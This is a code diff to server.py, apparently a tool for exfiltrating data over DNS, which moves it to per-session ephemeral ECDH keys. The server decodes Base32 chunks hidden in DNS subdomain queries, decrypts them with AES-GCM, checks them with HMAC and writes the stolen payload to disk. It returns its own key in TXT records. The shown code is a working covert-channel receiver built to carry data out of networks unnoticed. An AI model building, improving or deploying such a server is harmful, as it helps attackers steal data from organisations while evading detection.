@@ -3,17 +3,17 @@
 Module Name: server.py
 
 Description:
-    DNS exfiltration server with ECDH key exchange, AES-GCM decryption,
-    Base32 decoding, and HMAC verification for integrity and authenticity.
+    DNS exfiltration server with per-session ephemeral ECDH key exchange,
+    AES-GCM decryption, Base32 decoding, and HMAC verification.
 
-    - Accepts client ephemeral public key via DNS subdomain, derives shared
-      AES and HMAC keys using X25519 and HKDF.
-    - Collects Base32-encoded chunks, applies padding, decodes payload bytes.
-    - Validates HMAC tag, decrypts AES-GCM ciphertext, and writes output file.
+    - Generates a fresh X25519 keypair for each client session (true PFS).
+    - Returns the server's ephemeral public key as a TXT record response.
+    - Derives per-session AES and HMAC keys via ECDH + HKDF.
+    - Collects Base32-encoded chunks, decodes, verifies HMAC, decrypts AES-GCM.
 
 Author: John Burns
 Date: 2025-05-02
-Version: 2.4 (Refactored for clarity)
+Version: 3.0 (Per-session ephemeral keys)
 """
 
 import argparse
@@ -31,11 +31,9 @@ from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import x25519
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
-from dnslib import DNSRecord, RR, QTYPE, A, TXT, SOA
-from dotenv import load_dotenv, find_dotenv
+from dnslib import DNSRecord, RR, QTYPE, A, TXT
 
-# Configure environment and logging
-load_dotenv(find_dotenv())
+# Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('server')
 
@@ -44,7 +42,7 @@ _session_lock = threading.Lock()
 fragments_by_id = defaultdict(dict)
 last_seen = defaultdict(lambda: time.time())
 shared_keys = {}
-client_key_buffers = defaultdict(list)
+session_server_pubkeys = {}
 
 # === Rate Limiting ===
 _rate_lock = threading.Lock()
@@ -58,7 +56,6 @@ def is_rate_limited(ip: str) -> bool:
     now = time.time()
     with _rate_lock:
         ts = _ip_timestamps[ip]
-        # Prune entries outside the current window
         _ip_timestamps[ip] = [t for t in ts if now - t < RATE_LIMIT_WINDOW]
         if len(_ip_timestamps[ip]) >= RATE_LIMIT_MAX:
             return True
@@ -131,7 +128,7 @@ def verify_hmac(payload, tag, hmac_key):
     return True
 
 
-# === DNS Handlers ===
+# === DNS Helpers ===
 def send_dns_response(data, addr, sock):
     """
     Send a minimal DNS A response (192.0.2.1) for given request.
@@ -145,22 +142,39 @@ def send_dns_response(data, addr, sock):
 # === Main Request Logic ===
 def handle_key_exchange(identifier, payload):
     """
-    Collect Base32-encoded client ephemeral public key fragments,
-    decode when complete, derive shared AES/HMAC keys, store them.
-    Returns True when keys established.
+    Generate an ephemeral server keypair for this session, derive shared keys,
+    and return the server's ephemeral public key bytes.
+
+    Idempotent: if session already has keys, returns cached server pubkey.
     """
     with _session_lock:
-        client_key_buffers[identifier].extend(payload.split('.'))
-        b32 = ''.join(client_key_buffers[identifier])
-    if len(b32) >= 52:
-        padded = pad_base32_string(b32)
-        client_pub = base64.b32decode(padded)
-        aes_key, hmac_key = derive_shared_key(handle_request.server_priv, client_pub)
-        with _session_lock:
-            shared_keys[identifier] = (aes_key, hmac_key)
-        logger.info(f"[{identifier}] Session keys established")
-        return True
-    return False
+        if identifier in shared_keys:
+            return session_server_pubkeys[identifier]
+
+    # Decode client public key from Base32 payload
+    b32 = payload.replace('.', '')
+    padded = pad_base32_string(b32)
+    client_pub_bytes = base64.b32decode(padded)
+
+    # Generate ephemeral server keypair
+    server_priv = x25519.X25519PrivateKey.generate()
+    server_pub_bytes = server_priv.public_key().public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw
+    )
+
+    # Derive shared keys
+    aes_key, hmac_key = derive_shared_key(server_priv, client_pub_bytes)
+
+    with _session_lock:
+        # Double-check after acquiring lock (another thread may have beaten us)
+        if identifier in shared_keys:
+            return session_server_pubkeys[identifier]
+        shared_keys[identifier] = (aes_key, hmac_key)
+        session_server_pubkeys[identifier] = server_pub_bytes
+
+    logger.info(f"[{identifier}] Ephemeral session keys established")
+    return server_pub_bytes
 
 
 def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
@@ -204,60 +218,21 @@ def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
 
 def handle_request(data, addr, sock, args):
     """
-    Main DNS packet handler: routes key exchange, data chunk logic,
-    and serves the public-key TXT record under public.<domain>.
+    Main DNS packet handler: routes key exchange (TXT) and data chunks (A).
     """
     client_ip = addr[0]
     if is_rate_limited(client_ip):
         logger.warning(f"Rate limit exceeded for {client_ip}, dropping request")
         return
 
-    # Parse QNAME and QTYPE once
     req = DNSRecord.parse(data)
     qname = str(req.q.qname).rstrip('.')
     qtype = req.q.qtype
 
-    # Only handle our delegated domain
     if not qname.endswith(args.domain):
         return
 
-    expected_name = f"public.{args.domain}".lower()
-
-    # ——— 1) Serve public.<domain> for ANY qtype, but only TXT returns data ———
-    if qname.lower() == expected_name:
-        # Always reply NOERROR
-        reply = req.reply()
-        reply.header.rcode = 0 # NOERROR
-        if qtype == QTYPE.TXT:
-            # On TXT queries include the Base32 public key
-            reply.add_answer(
-                RR(req.q.qname,
-                   QTYPE.TXT,
-                   rdata=TXT(handle_request.server_pub_b32),
-                   ttl=300)
-            )
-        else:
-            reply.add_auth(
-                RR(
-                    f"{args.domain}.",  # the zone apex
-                    QTYPE.SOA,  # or QTYPE.NS
-                    rdata=SOA(
-                        mname=f"ns1.{args.domain}.",
-                        rname=f"hostmaster.{args.domain}.",
-                        times=(1,  # serial
-                               3600,  # refresh
-                               900,  # retry
-                               604800,  # expire
-                               86400)  # minimum
-                    ),
-                    ttl=300
-                )
-            )
-        # For A, ANY, etc., leave answer section empty (prevents NXDOMAIN caching)
-        sock.sendto(reply.pack(), addr)
-        return
-
-    # ——— 2) Key‐exchange or chunk logic for <id>-<idx>-<total>-<payload> ———
+    # Parse subdomain: <id>-<idx>-<total>-<payload>.<domain>
     prefix = qname[:-(len(args.domain) + 1)]
     parts = prefix.split('-', 3)
     if len(parts) != 4:
@@ -266,20 +241,23 @@ def handle_request(data, addr, sock, args):
     identifier, index, total, payload = parts
 
     if index == '0' and total == '0':
-        # Handle the client's ephemeral public key
-        handle_key_exchange(identifier, payload)
-    else:
-        # Handle actual data chunks
-        handle_data_chunk(identifier, index, total, payload, args, sock, addr)
+        # Key exchange: client sends pubkey, server responds with its ephemeral pubkey
+        server_pub_bytes = handle_key_exchange(identifier, payload)
 
-    # Finally send the usual A-record response for chunk ACKs
-    send_dns_response(data, addr, sock)
+        # Respond with TXT record containing Base32-encoded server pubkey
+        server_pub_b32 = base64.b32encode(server_pub_bytes).decode('ascii').rstrip('=')
+        reply = req.reply()
+        reply.add_answer(
+            RR(req.q.qname, QTYPE.TXT, rdata=TXT(server_pub_b32), ttl=0)
+        )
+        sock.sendto(reply.pack(), addr)
+    else:
+        # Data chunks
+        handle_data_chunk(identifier, index, total, payload, args, sock, addr)
+        send_dns_response(data, addr, sock)
+
 
 # === Cleanup Thread ===
-# Bind server private key into handle_request for convenience
-handle_request.server_priv = None
-
-
 def cleanup_stale(ttl=600, interval=60):
     """
     Periodically remove sessions idle longer than TTL.
@@ -291,7 +269,7 @@ def cleanup_stale(ttl=600, interval=60):
             for ident in stale:
                 fragments_by_id.pop(ident, None)
                 shared_keys.pop(ident, None)
-                client_key_buffers.pop(ident, None)
+                session_server_pubkeys.pop(ident, None)
                 last_seen.pop(ident, None)
                 logger.info(f"[{ident}] Session expired and cleaned up")
         time.sleep(interval)
@@ -299,20 +277,8 @@ def cleanup_stale(ttl=600, interval=60):
 
 def start_server(args):
     """
-    Initialize server state, load private key, and begin listening.
+    Initialize server and begin listening. No key files needed.
     """
-    if not args.server_key:
-        raise ValueError("Missing server private key path")
-
-    with open(args.server_key, 'rb') as f:
-        priv = x25519.X25519PrivateKey.from_private_bytes(f.read())
-    handle_request.server_priv = priv
-
-    with open(args.server_pubkey, 'rb') as f:
-        pub = x25519.X25519PublicKey.from_public_bytes(f.read())
-    handle_request.server_pub_b32 = base64.b32encode(
-        pub.public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)).decode('ascii')
-
     thread = threading.Thread(target=cleanup_stale, daemon=True)
     thread.start()
 
@@ -335,12 +301,9 @@ def start_server(args):
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (ECDH + AES-GCM + HMAC)")
+    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (Ephemeral ECDH + AES-GCM + HMAC)")
     parser.add_argument('--port', type=int, default=5300)
     parser.add_argument('--output-dir', default='output')
     parser.add_argument('--domain', default='xf.example.com')
-    parser.add_argument('--server-key', default=os.getenv('SERVER_PRIVATE_KEY'), help='Path to X25519 private key file')
-    parser.add_argument('--server-pubkey', default=os.getenv('SERVER_PUBLIC_KEY'), help='Path to server public key')
     args = parser.parse_args()
     start_server(args)
-
